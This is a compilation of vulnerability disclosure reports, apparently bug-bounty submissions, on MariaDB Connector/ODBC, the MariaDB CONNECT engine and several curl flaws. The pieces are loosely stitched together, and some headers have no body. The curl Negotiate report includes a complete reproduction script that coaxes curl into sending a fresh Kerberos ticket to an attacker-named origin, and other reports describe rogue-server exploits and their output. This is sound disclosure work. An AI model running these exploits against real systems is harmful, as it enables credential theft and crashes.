- The same `_snprintf` negative-return footgun exists in `MADB_DsnToString` (Windows prompt path) and catalog-query builders - should be reviewed as part of the same fix
- Attachments: `rogue_server.py`, `odbc_client.c`, `direct_version_check.c`, `harness.cpp`, `run_poc.sh`, `poc_evidence.txt`

## Impact

A malicious or MITM MariaDB/MySQL server corrupts client-process memory (out-of-bounds write) in any application using MariaDB Connector/ODBC, the moment it opens a connection and allocates a statement. The demonstrated effect is a reliable crash (denial of service) via an AddressSanitizer-confirmed heap out-of-bounds write.

The write offset is chosen by the attacker through the version-string length, and the `strcpy_s` sink (`MADB_SetNativeError`) copies attacker-influenced content (server error text) to that attacker-chosen backward offset, so corruption of adjacent heap objects - and potentially impact beyond DoS - is plausible on non-hardened builds. Only the crash is demonstrated here.

Blast radius: every application (BI tools, ETL jobs, application servers, `isql`, etc.) that connects through MariaDB Connector/ODBC. Preconditions: (a) client connects to a server the attacker controls or can MITM (driver default is plaintext - no TLS), and (b) the application allocates a statement, which every ODBC workflow does. No credentials, privileges, or human interaction beyond initiating the connection are required.

title: Stack Buffer Overflow in MariaDB CONNECT storage engine when reading DOUBLE columns from TABLE_TYPE=DOS tables

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
This problem is located in storage/connect/value.cpp, function `TYPVAL<double>::SetValue_char()`. The function copies at most 31 bytes into a 64-byte stack buffer, but subsequently places the terminating "\0" byte using the original field length (n) instead of the bounded length.
```
bool TYPVAL<double>::SetValue_char(const char *p, int n){
  if (p && n > 0) {
    char buf[64];

    for (; n > 0 && *p == ' '; p++)
      n--;

    memcpy(buf, p, MY_MIN(n, 31));
    buf[n] = '\0';
```

When a DOUBLE(M,D) column is read back from a TABLE_TYPE='DOS' file, TYPVAL<double>::SetValue_char() copies the textual field into a 64-byte stack buffer, and then writes the terminating NUL byte at index n , where n is the SQL-declared field width, not the bounded copy length. The memcpy() that fills the buffer is correctly clamped with MY_MIN(n, 31), but the terminator buf[n] = '\0' is not clamped at all.

Because the SQL layer accepts widths up to 255, the C layer ends up executing buf[255] = '\0' on a 64-byte buffer, a single-byte (0x00) write up to 191 bytes past its end (for example).

Call chain:
1)  DOUBLE(255,30) is accepted by the SQL layer and field_length becomes 255 (sql/field.cc)
2)   CONNECT copies the declared width unchanged (ha_connect.cc)
3)  That length becomes the column's Long field, again unchanged (reldef.cpp, colblk.cpp, tabdos.cpp)
4)   DOSCOL::ReadColumn() assigns field = Long and passes it straight into the value parser (tabdos.cpp)
```
        case TYPE_DOUBLE:
          if (!(err = Value->SetValue_char(p, field))) {
```

PoC:

1)  Build with ASAN
2)  Run PoC.sh script (trigger + config inline in its launch flags)

Dockerfile:
https://gist.github.com/dldLambda/58ad85abfb9bc65d661a69faba7523e0
PoC.sh script:
https://gist.github.com/dldLambda/f4bc2a9c343bb28404989dba2628d2bf

Under ASAN, the server reports a stack-buffer-overflow write of 1 byte at the buf[n] = '\0' line in TYPVAL<double>::SetValue_char
Without ASAN, the server crashes

## Impact

Attacker can trigger a Denial of Service by crashing the MariaDB server.

title: RCE in AWS Amplify CLI via Prototype Chain Traversal in amplify-velocity-template
CVE-2026-92392: HTTP/2 upload Use-After-Free
vulnerability_information:
## Summary:
During a file upload, curl mishandles HTTP/2 RST_STREAM received from the server (with reason HTTP_1_1_REQUIRED or REFUSED_STREAM) leading to a use after free of a `struct Curl_easy` object. The control flow is a bit complicated, so I've produced an ASCII tree of the control flow to highlight the object lifetime issue in the Appendix below.

Preconditions for this are `curl -T <file>`, where `<file>` contains anywhere "<word> <word> <any>\n\n" and exceeds ~135KB. Our PoC exploit also requires `-Z`/`--parallel` when PIE/ASLR is enabled, but this is not necessary to trigger the memory corruption, only for exploitation.

As for how the UAF happens, after receiving the reset, multi.c converts the reset into a retry and calls `multi_done()`. In `multi_done()`, it calls `Curl_conn_ev_data_done()` which makes curl forget about the transfer, then it calls `Curl_req_done()`. Then `Curl_req_done()` flushes the buffered unsent remainder of the upload body into the connection. Since curl no longer knows about the transfer, it treats those bytes as a new request.  If they look like a request line, `h2_submit()` opens a new stream that stores a pointer to the `Curl_easy` object. This is the pointer that will be UAFed. After the retry completes, the application frees the `Curl_easy` object, but the connection still holds the pointer. It is dereferenced when the server sends a frame on that stream which can happen at exit, when the connection pool is destroyed.

## Affected version
8.22.0

## Steps To Reproduce:
I've attached a malicious server that triggers the bug (`evil-server.py`)

```bash
wget 'https://curl.se/download/curl-8.22.0.tar.gz'
sha1sum curl-8.22.0.tar.gz # should be 284e444b67f676a281906cfc86e9672780555cd4
tar xf curl-8.22.0.tar.gz
mkdir build ; cd build
# build with ASAN enabled
CC=clang CFLAGS="-O2 -g -fsanitize=address"" LDFLAGS="-Wl,-rpath,/opt/curl-release/lib" \
    ../curl-8.22.0/configure --prefix=/opt/curl-release \
      --enable-static --enable-shared --disable-docs --disable-manual \
      --with-openssl --with-zlib --with-brotli --with-zstd --with-libidn2 \
      --with-nghttp2 --with-libpsl --with-libssh2 --with-gssapi \
      --enable-ldap --enable-ldaps --enable-websockets --enable-mqtt --enable-ipfs \
```

title: CVE-2026-87861: cross-origin reuse of a Negotiate connection
vulnerability_information:
## Summary:
I found a cross-origin connection reuse flaw in `lib/url.c`, introduced by [bd10924b4](https://github.com/curl/curl/commit/bd10924b4) as part of the recently announced "Patch the Planet" initiative. It causes a request for one origin to be sent on a connection that was authenticated with Negotiate for a different origin, while the requesting transfer's own credentials go unused.

My research looked at the reuse matchers that [bd10924b4](https://github.com/curl/curl/commit/bd10924b4) rewrote. The commit closed [#22040](https://github.com/curl/curl/pull/22040) by adding `conn->creds_origin` and comparing it against `data->state.origin`. This activity is correct, but the issue is in the branch the commit replaced. At the parent [c2b050e4e496](https://github.com/curl/curl/commit/c2b050e4e496), the credential mismatch branch of `url_match_auth_ntlm` recorded a connection as a reuse candidate only when both auth states were idle:

```c
#ifdef USE_SPNEGO
      if((conn->http_ntlm_state == NTLMSTATE_NONE) &&
         (conn->http_negotiate_state == GSS_AUTHNONE)) {
#else
      if(conn->http_ntlm_state == NTLMSTATE_NONE) {
#endif
        m->found = conn;
      }
```

[bd10924b4](https://github.com/curl/curl/commit/bd10924b4) replaced that entire branch with a single early return gated on `conn->creds`, so the `GSS_AUTHNONE` condition is gone. That gate does not fire in the ordinary Kerberos SSO case. `Curl_http_output_auth` exempts Negotiate from the no-credentials early out, so `--negotiate` with no `-u` runs from the ticket cache with `data->state.creds` `NULL`, and `Curl_input_negotiate` links `conn->creds_origin` to the origin while `Curl_creds_link(&conn->creds, NULL)` leaves `conn->creds` `NULL`. A later transfer whose wanted auth includes `NTLM` (`CURLAUTH_ANY` masks off only `CURLAUTH_DIGEST_IE` and `CURLAUTH_HTTPSIG`, so `--anyauth` qualifies) then passes `url_match_auth`, because `needle->creds` is `NULL` for HTTP and `Curl_creds_same(NULL, NULL)` is `TRUE`. 

It reaches the state-NONE branch at `url.c:937`, where the origin comparison is gated on `conn->creds` and does not run. Control falls through to `url.c:962`, which sets `m->found = conn` and returns `FALSE` because the NTLM state is idle. `url_match_conn` returns `FALSE` on that, so `url_match_auth_nego`, the only matcher that compares the two origins, never runs, and `url_match_result` attaches `match->found` when no better candidate was found. Both origins need to sit behind one forwarding proxy, which `lib/proxy.c` arranges by setting `conn->origin` to the proxy peer, putting every origin behind that proxy in a single cpool bundle.

## Affected version
curl 8.21.0-DEV (Darwin) libcurl/8.21.0-DEV OpenSSL/3.6.3 mit-krb5/1.7-prerelease OpenLDAP/2.4.28/Apple
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS GSS-API HSTS HTTPS-proxy IPv6 Kerberos Largefile NTLM SPNEGO SSL threadsafe TLS-SRP UnixSockets

## Steps To Reproduce:
Requires git, cmake, a C compiler, OpenSSL, MIT Kerberos and uv.

1. Build curl at the affected commit.

```bash
git clone https://github.com/curl/curl.git curl-src
cd curl-src && git checkout bd10924b47c8bf94127eaee8c56e7b5e5418da46
cmake -S . -B bld \
  -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DBUILD_CURL_EXE=ON \
  -DCURL_USE_OPENSSL=ON -DCURL_USE_GSSAPI=ON -DCURL_ENABLE_NTLM=ON \
  -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF -DUSE_NGHTTP2=OFF \
  -DCURL_ZLIB=OFF -DCURL_BROTLI=OFF -DCURL_ZSTD=OFF -DENABLE_CURL_MANUAL=OFF
cmake --build bld -j8 --target curl

./bld/src/curl -V must list SPNEGO and NTLM in Features.
```

2. Unpack the archive and point it at that binary.

```bash
unzip curl-22040-ntlm-connection-reuse.zip
cd curl-22040-ntlm-connection-reuse/pocs/ntlm-cross-origin-reuse
export CURL_BIN=/path/to/curl-src/bld/src/curl
./run.sh

Result at bd10924b4:

  conn  origin        Authorization       status
  1     a.internal    NTLM type1          401
  1     b.internal    NTLM type3          200

RESULT: REUSED ACROSS ORIGINS
```

One connection sends the type1 for a.internal, takes that origin's challenge, then sends the type3 on a request for b.internal.

## Impact

## Summary:
A request for one origin is sent on a connection that was already authenticated with Negotiate for a different origin, so the second host sees the first host's authenticated session and the requesting transfer's own credentials go unused. Both origins have to sit behind one forwarding proxy, which is what places them in a single connection bundle, so the realistic setting is an application doing Kerberos SSO across internal hosts through a corporate proxy. The result is that a request meant for host B is attributed to the caller's identity on host A, with no credential check having run on the reuse path.

title: CVE-2026-94265: Authorization: Negotiate sent to foreign origin
vulnerability_information:
Hi all,

I've discovered that curl can be made to send an "Authorization: Negotiate" header, carrying a freshly minted Kerberos ticket for the victim's ambient identity, to a host chosen by an HTTP redirect, without --location-trusted. All the attacker has to do is put arbitrary userinfo in the Location header they redirect to. This contradicts the guarantee documented for CURLOPT_UNRESTRICTED_AUTH, which says that with the option unset libcurl "does not send custom nor internally generated Authorization: or Cookie: headers on requests done to other hosts than the one used for the initial URL".

I have an end-to-end PoC against a real KDC on pristine upstream d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV), a control showing the protection holds when the userinfo is removed, and a small fix that I have verified closes it without regressing either normal Negotiate or --location-trusted. Details below.

How it works
------------

The gate asks "do I have any credentials?" when it should ask "am I still on the original host?"

```
  https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L872-L878

    /* Either we have credentials for the origin we talk to or
       performing authentication is allowed here */
    if(data->state.creds || Curl_auth_allowed_to_host(data))
      result = output_auth_headers(data, conn, authhost, request,
                                   path_and_query, FALSE);
    else
      authhost->done = TRUE;
```

That "||" is the whole vulnerability. Either condition is enough.

The flow:

  1. You run `curl --negotiate -L http://intranet/` - Kerberos SSO, no password typed.
  2. `intranet` redirects you to `http://bob:alice@attacker.example/`.
  3. curl correctly drops *your* credentials, because it is a different host. But it then parses `bob:alice` out of the attacker's own URL and stores it in state.creds. That path has no origin check.
  4. Gate: credentials exist -> proceed. The origin check is never consulted.
  5. The Negotiate branch runs. It throws `bob:alice` away, goes to the KDC, and gets a fresh Kerberos ticket for HTTP/attacker.example. Sends it.

The attacker now holds a Kerberos AP-REQ for their own service, proving your identity.

What makes it odd is that a credential which is never used unlocks an authentication that does not use credentials. `bob:alice` is neither forwarded nor checked. Its only job is to be non-NULL.

Same PoC, one change, which is the proof that this and nothing else is the cause:

  | Redirect target                    | Attacker receives                                   |
  |------------------------------------|-----------------------------------------------------|
  | http://bob:alice@attacker.example/ | Authorization: Negotiate <ticket for HTTP/attacker> |
  | http://attacker.example/           | nothing                                             |


Code paths
----------

1. Application-set credentials ARE origin-checked, so yours are correctly dropped on the redirect.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1355-L1360

    if((CURL_EASY_STR(data, STRING_USERNAME) ||
        CURL_EASY_STR(data, STRING_PASSWORD) ||
        CURL_EASY_STR(data, STRING_BEARER) ||
        CURL_EASY_STR(data, STRING_SASL_AUTHZID) ||
        CURL_EASY_STR(data, STRING_SERVICE_NAME)) &&
       Curl_auth_allowed_to_origin(data, data->state.origin)) {
```

2. Credentials taken from the URL are NOT origin-checked. The redirect target is attacker-chosen, so this repopulates state.creds for the foreign origin.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1383-L1391

    if(!newcreds || !Curl_creds_has_user(newcreds)) {
      char *user = NULL;
      char *passwd = NULL;
      char *udecoded = NULL;
      char *pdecoded = NULL;
      CURLUcode uc;
  
      uc = curl_url_get(uh, CURLUPART_USER, &user, 0);
      if(uc && (uc != CURLUE_NO_USER))
```

3. The gate accepts that, and output_auth_headers() runs for the foreign origin.
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L874

4. The HTTPSIG branch guards against exactly this. The Negotiate branch directly below it does not - it only checks that the application did not set its own header.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L671-L704

  #ifndef CURL_DISABLE_HTTPSIG
    if((authstatus->picked == CURLAUTH_HTTPSIG) && !proxy) {
      /* HTTPSIG uses its own configured key material rather than
         data->state.creds. Do not let unrelated credentials from a
         redirected URL bypass the cross-host auth boundary. */
      if(Curl_auth_allowed_to_host(data)) {
        auth = "HTTPSIG";
        result = Curl_output_httpsig(data);
        if(result)
          return result;
      }
      else
        authstatus->done = TRUE;
    }
    else
  #endif
  #ifdef USE_SPNEGO
    if(authstatus->picked == CURLAUTH_NEGOTIATE) {
      if(
  #ifndef CURL_DISABLE_PROXY
        (proxy && !Curl_checkProxyheaders(data, conn,
                                          STRCONST("Proxy-authorization"))) ||
  #endif
        (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")))) {
        auth = "Negotiate";
        result = Curl_output_negotiate(data, conn, proxy);
        if(result)
          return result;
      }
      else
        authstatus->done = TRUE;
    }
    else
  #endif
```

5. Negotiate needs no username, so the ambient credential cache is used. The credentials that unlocked the gate are explicitly discarded.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/spnego_gssapi.c#L92

    (void)creds;
```

6. The SPN is built from the CURRENT origin, which is the attacker's hostname.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L77

      host = data->state.origin->hostname;
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L126-L127

    result = Curl_auth_decode_spnego_message(data, creds, "HTTP",
                                             host, header, neg_ctx);
```

7. The boundary being bypassed.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/vauth.c#L140-L149

  bool Curl_auth_allowed_to_host(struct Curl_easy *data)
  {
    return Curl_auth_allowed_to_origin(data, data->state.origin);
  }
  
  bool Curl_auth_allowed_to_origin(struct Curl_easy *data,
                                   struct Curl_peer *origin)
  {
    return data->set.allow_auth_to_other_hosts ||
           Curl_peer_equal(data->state.initial_origin, origin);
```

8. Worth noting that a CUSTOM Authorization header is already blocked cross-host. Only the internally generated one is not.
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1878-L1883

```
        else if((curlx_str_casecompare(&name, "Authorization") ||
                 curlx_str_casecompare(&name, "Cookie")) &&
                /* be careful of sending this potentially sensitive header to
                   other hosts */
                !Curl_auth_allowed_to_host(data))
          ;
```

Reproduction
------------

Verified on pristine upstream curl/curl d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV, GSS-API + SPNEGO, MIT krb5 1.22.2), and also on 557e43b237 of my own tree (8.22.1-DEV). Build with -DCURL_USE_GSSAPI=ON so that `curl -V` lists SPNEGO.

```
  VF_CURL=<curl-with-spnego> sh reproduce.sh exploit
  VF_CURL=<curl-with-spnego> sh reproduce.sh control
```

The script stands up a throwaway MIT Kerberos realm (KDC, one user principal, two service principals), kinits a victim who has never heard of attacker.poc.test, and runs curl against a legit origin that 301-redirects to an attacker origin. The only difference between the two arms is whether the Location header carries userinfo.

Results:

  exploit: attacker origin received Authorization: Negotiate (1060 b64 chars)
    AP-REQ principal fields: ['POC.TEST', 'HTTP', 'attacker.poc.test']
  control: attacker origin received NO Authorization header

The token is a SPNEGO wrapper (OID 1.3.6.1.5.5.2) over a krb5 AP-REQ (OID 1.2.840.113554.1.2.2) whose ticket sname is HTTP/attacker.poc.test in realm POC.TEST. legit.poc.test does not appear anywhere in it, so it is a newly minted ticket rather than a replay of the one sent to the first host. klist afterwards confirms the KDC issued HTTP/attacker.poc.test@POC.TEST to the victim, for a host the caller never asked to contact.

  reproduce.sh:
  ```sh
  #!/bin/sh
  # Reproduces the cross-origin SPNEGO/Negotiate leak in lib/http.c.
  #
  # Env overrides (defaults suit a Homebrew MIT krb5 on macOS):
  #   VF_CURL   - curl built with SPNEGO (`curl -V` must list GSS-API or SPNEGO)
  #   VF_WORK   - scratch dir                        (default /tmp/vf-nego)
  #   VF_KRB5   - MIT krb5 prefix                    (default /opt/homebrew/opt/krb5)
  #   VF_KDCP   - KDC port                           (default 19188)
  #   VF_APORT  - "legit" origin port                (default 19218)
  #   VF_BPORT  - "attacker" origin port             (default 19219)
  set -e
  MODE="$1"
  WORK="${VF_WORK:-/tmp/vf-nego}"
  KRB5="${VF_KRB5:-/opt/homebrew/opt/krb5}"
  KDCP="${VF_KDCP:-19188}"
  APORT="${VF_APORT:-19218}"
  BPORT="${VF_BPORT:-19219}"
  CURL_BIN="${VF_CURL:-curl}"
  MARKER="$WORK/attacker-received-negotiate"
  
  # Clean at the START of every arm: both arms share one work dir, so the control
  # must not inherit a marker left by the exploit arm.
  pkill -f "krb5kdc -n -P $WORK/kdc.pid" 2>/dev/null || true
  rm -rf "$WORK"
  mkdir -p "$WORK/db"
  
  # Exploit: the redirect Location carries unrelated userinfo, which makes
  # data->state.creds non-NULL for the foreign origin and satisfies the
  # `data->state.creds ||` half of the gate at lib/http.c:874.
  # Control: identical, but no userinfo -> the gate correctly blocks the header.
  if [ "$MODE" = "exploit" ]; then
    LOC="http://bob:alice@attacker.poc.test:$BPORT/step2"
  else
    LOC="http://attacker.poc.test:$BPORT/step2"
  fi
  
  # --- Throwaway Kerberos realm: test infrastructure only, NOT the target. ---
  cat > "$WORK/krb5.conf" <<EOF
  [libdefaults]
      default_realm = POC.TEST
      dns_lookup_kdc = false
      dns_lookup_realm = false
      rdns = false
  [realms]
      POC.TEST = {
          kdc = 127.0.0.1:$KDCP
      }
  [domain_realm]
      .poc.test = POC.TEST
      poc.test = POC.TEST
  EOF
  cat > "$WORK/kdc.conf" <<EOF
  [kdcdefaults]
      kdc_ports = $KDCP
      kdc_tcp_ports = $KDCP
  [realms]
      POC.TEST = {
          database_name = $WORK/db/principal
          key_stash_file = $WORK/db/stash
          acl_file = $WORK/db/kadm5.acl
          supported_enctypes = aes256-cts:normal
      }
  EOF
  export KRB5_CONFIG="$WORK/krb5.conf"
  export KRB5_KDC_PROFILE="$WORK/kdc.conf"
  export KRB5CCNAME="$WORK/victim.ccache"
  
  "$KRB5/sbin/kdb5_util" create -s -P testmaster -r POC.TEST >/dev/null
  # The victim's realm contains an SPN for the attacker's host. The victim has
  # never heard of it; only the KDC's realm membership matters.
  "$KRB5/sbin/kadmin.local" -q "addprinc -pw victimpass victim"            >/dev/null 2>&1
  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/legit.poc.test"     >/dev/null 2>&1
  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/attacker.poc.test"  >/dev/null 2>&1
  "$KRB5/sbin/krb5kdc" -n -P "$WORK/kdc.pid" > "$WORK/kdc.log" 2>&1 &
  KDC_PID=$!
  i=0; while [ $i -lt 30 ]; do i=$((i+1)); sleep 0.1; done
  printf 'victimpass\n' | "$KRB5/bin/kinit" victim >/dev/null
  
  # --- Origin A ("legit"): redirects to origin B. ---
  cat > "$WORK/a.py" <<EOF
  import http.server, sys
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(301)
          self.send_header("Location", "$LOC")
          self.send_header("Content-Length", "0")
          self.end_headers()
      def log_message(self, *a): pass
  http.server.HTTPServer(("127.0.0.1", $APORT), H).serve_forever()
  EOF
  
  # --- Origin B ("attacker"): reached only via A's redirect. Records whether the
  #     victim's client presented an ambient-credential Negotiate token. ---
  cat > "$WORK/b.py" <<EOF
  import http.server, sys
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          a = self.headers.get("Authorization")
          if a and a.lower().startswith("negotiate"):
              open("$MARKER", "w").write(a.split(" ", 1)[1].strip())
          self.send_response(200)
          self.send_header("Content-Length", "0")
          self.end_headers()
      def log_message(self, *a): pass
  http.server.HTTPServer(("127.0.0.1", $BPORT), H).serve_forever()
  EOF
  
  python3 "$WORK/a.py" & A_PID=$!
  python3 "$WORK/b.py" & B_PID=$!
  i=0; while [ $i -lt 20 ]; do i=$((i+1)); sleep 0.1; done
  
  : > "${VF_READY:-/dev/null}"
  
  # Exercise the shipped curl exactly ONCE. Identical command in both arms.
  # --negotiate selects SPNEGO; note the ABSENCE of --location-trusted.
  timeout 20 "$CURL_BIN" -sS --negotiate --location \
    --resolve "legit.poc.test:$APORT:127.0.0.1" \
    --resolve "attacker.poc.test:$BPORT:127.0.0.1" \
    "http://legit.poc.test:$APORT/start" -o /dev/null 2>"$WORK/curl.err" || true
  
  { kill "$A_PID" "$B_PID" "$KDC_PID"; wait; } 2>/dev/null || true
  
  if [ -f "$MARKER" ]; then
    echo "$MODE: attacker origin received Authorization: Negotiate ($(wc -c < "$MARKER" | tr -d ' ') b64 chars)"
    python3 - "$MARKER" <<'PY'
  import base64, sys
  raw = base64.b64decode(open(sys.argv[1]).read())
  runs, i = [], 0
  while i < len(raw):
      if raw[i] == 0x1b and 0 < raw[i+1] < 64:
          s = raw[i+2:i+2+raw[i+1]]
          if all(32 <= c < 127 for c in s) and len(s) >= 4:
              runs.append(s.decode()); i += 2 + raw[i+1]; continue
      i += 1
  print("  AP-REQ principal fields:", runs)
  PY
  else
    echo "$MODE: attacker origin received NO Authorization header"
  fi
  ```


Suggested fix
-------------


```
  diff --git a/lib/http.c b/lib/http.c
  index 3ed023753d..4b31cc2376 100644
  --- a/lib/http.c
  +++ b/lib/http.c
  @@ -691,7 +691,8 @@ static CURLcode output_auth_headers(struct Curl_easy *data,
         (proxy && !Curl_checkProxyheaders(data, conn,
                                           STRCONST("Proxy-authorization"))) ||
   #endif
  -      (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")))) {
  +      (!proxy && !Curl_checkheaders(data, STRCONST("Authorization")) &&
  +       Curl_auth_allowed_to_host(data))) {
         auth = "Negotiate";
         result = Curl_output_negotiate(data, conn, proxy);
         if(result)
  @@ -704,10 +705,14 @@ static CURLcode output_auth_headers(struct Curl_easy *data,
   #endif
   #ifdef USE_NTLM
     if(authstatus->picked == CURLAUTH_NTLM) {
  -    auth = "NTLM";
  -    result = Curl_output_ntlm(data, proxy);
  -    if(result)
  -      return result;
  +    if(proxy || Curl_auth_allowed_to_host(data)) {
  +      auth = "NTLM";
  +      result = Curl_output_ntlm(data, proxy);
  +      if(result)
  +        return result;
  +    }
  +    else
  +      authstatus->done = TRUE;
     }
     else
   #endif
```

Cheers,
Josh

## Impact

The attacker controls the long-term key for the SPN they redirected you to (think: website with an open redirect vulnerability), so they can decrypt the AP-REQ and learn your authenticated identity. With CURLOPT_GSSAPI_DELEGATION the ticket is forwardable, and on Windows SSPI an unknown SPN falls back to NTLM, which yields a relay-able NTLM exchange. I did not demonstrate either of those two outcomes, so they are not reflected in the CVSS score above.

Note this is not the classic "credential leak on redirect" pattern where an existing header value is forwarded to a new host. curl performs a complete, fresh authentication handshake against the attacker's service on your behalf, so the exposure is not bounded by what you previously sent.

title: CVE-2026-94266: password leak in CURLINFO_EFFECTIVE_URL
vulnerability_information:
A `.netrc`-sourced password, injected into the live URL handle at login time, survives an ordinary same-host relative `Location:` redirect and ends up verbatim in `data->state.url`, so it is exposed via `CURLINFO_EFFECTIVE_URL`, `curl -w '%{url_effective}'`, and verbose (`-v`) output.

## Affected code

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1325-L1332

```c
      result = Curl_creds_merge(ncreds_out->user, ncreds_out->passwd,
                                *pcreds, CREDS_NETRC, pcreds);
      if(result)
        goto out;
      /* for updated strings, we update them in the URL */
      uc = curl_url_set(data->state.uh, CURLUPART_USER,
                        Curl_creds_user(*pcreds), CURLU_URLENCODE);
      if(!uc)
        uc = curl_url_set(data->state.uh, CURLUPART_PASSWORD,
                          Curl_creds_passwd(*pcreds),
                          CURLU_URLENCODE);
```

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1244

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1298-L1306

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/urlapi.c#L1334-L1401

https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/getinfo.c#L83-L86

## Details

1. `url_set_data_creds_netrc()` (lib/url.c:1325-1332) writes the `.netrc` user/password directly into `data->state.uh`, the handle later reused to compute the effective URL. It is never cleared.
2. On a redirect, `Curl_http_follow()` calls `curl_url_set(data->state.uh, CURLUPART_URL, newurl, ...)` (http.c:1244), reparsing the same, already-dirty handle with the `Location:` value.
3. For a relative `Location: /path`, `redirect_url()` (urlapi.c:1334) computes `cutoff = strchr(protsep, '/')` and copies `base[0..cutoff)`, i.e. `scheme://user:pass@host:port`, verbatim into the new URL before appending the new path (urlapi.c:1355-1362, 1391-1397). `CURLU_URLENCODE` only percent-escapes non-unreserved bytes, so a plain alphanumeric password passes through unchanged.
4. The result is read back and stored: `Curl_bufref_set(&data->state.url, follow_url, ...)` (http.c:1298) and `infof(data, "Issue another request to this URL: '%s'", follow_url)` (http.c:1306).
5. `CURLINFO_EFFECTIVE_URL` returns `Curl_bufref_ptr(&data->state.url)` unsanitized (getinfo.c:84).

An *absolute* `Location:` does not leak: `set_url()` fully resets the handle before parsing, so no stale userinfo carries forward. Only the relative-reference path is affected. The first-hop effective URL is also clean, since `data->state.url` is populated (url.c) before the netrc injection runs; the leak appears starting from the first redirect.

## Reproducer

`.netrc`:
```
machine 127.0.0.1
login netrcuser
password netrcSECRET123
```

Server: answers `/first` with `302 Found` + `Location: /newpath`.

```
curl -v -L --netrc-file netrc_test --netrc-optional \
  -w '\nEFFECTIVE_URL=%{url_effective}\n' http://127.0.0.1:25036/first
```

Captured output (built from clean upstream commit d1823ebc17):
```
* Issue another request to this URL: 'http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath'
...
EFFECTIVE_URL=http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath
```

Confirmed identically via direct libcurl API (`CURLOPT_NETRC=CURL_NETRC_OPTIONAL`, `CURLOPT_FOLLOWLOCATION=1`, then `curl_easy_getinfo(CURLINFO_EFFECTIVE_URL)`):
```
CURLINFO_EFFECTIVE_URL = http://netrcuser:netrcSECRET123@127.0.0.1:25036/newpath
RESULT: netrc password LEAKED into CURLINFO_EFFECTIVE_URL
```

## Suggested fix

Strip userinfo from `data->state.uh` before it is used to compute the redirect follow-URL / effective URL, the same way the Referer builder already does (`curl_url_set(u, CURLUPART_USER/PASSWORD, NULL, 0)`, http.c:1219-1221) and the non-tunnelling proxy request-target builder does (http.c:2161-2173). This needs to happen without disturbing the credentials curl still needs to send the actual `Authorization` header on the next hop.

## Impact

The impact is disclosure of `.netrc` usernames and passwords into places that applications commonly treat as safe URL metadata:

* `CURLINFO_EFFECTIVE_URL`
* `CURLINFO_REDIRECT_URL`, even without following the redirect
* `%{url_effective}` and `%{redirect_url}`
* verbose/debug output

A server can trigger this by returning a relative `Location:`. If the application records, displays, returns, or forwards these values to logs, monitoring systems, users, or another service, the netrc password can escape its intended credential store.

The server does not directly receive the password, and absolute cross-origin redirects do not carry it. Exploitation therefore needs a secondary observer of the URL metadata or logs. That makes it a real confidentiality flaw, but likely low severity rather than direct remote credential theft.

title: CVE-2026-87865: knownhost callback mismatches key as missing

weakness.name: Improper Validation of Certificate with Host Mismatch

vulnerability_information:
When libcurl uses libssh2 with a hashed OpenSSH known_hosts file, an unrelated first entry can make a hostile key for an already pinned SFTP/SCP host reach CURLOPT_SSH_KEYFUNCTION as CURLKHMATCH_MISSING instead of CURLKHMATCH_MISMATCH.

At https://github.com/curl/curl/blob/68720b4837284335b2d63cb358f8f6ce65f5bc55/lib/vssh/libssh2.c#L653-L687, curl treats the first hashed entry whose public name is NULL as the destination and forces that entry's key algorithm without checking its hostname hash.

With an unrelated hashed RSA entry before the target's hashed Ed25519 entry, a hostile RSA server negotiates successfully; libssh2 then filters out the Ed25519 pin and curl passes NOTFOUND to the callback as MISSING.

To reproduce on curl 8.21.0 commit 68720b4837284335b2d63cb358f8f6ce65f5bc55, build shared libcurl with `cmake -S . -B build -DCURL_USE_LIBSSH2=ON -DBUILD_SHARED_LIBS=ON`, extract the attachment, and run `python3 poc.py --build-dir /absolute/path/to/build --output run.json`.

Both exploit runs exit 0, the callback receives MISSING, the hostile server receives the password canary, and libcurl returns ATTACKER_SFTP_BODY; the target-first and same-type MISMATCH controls send no password.

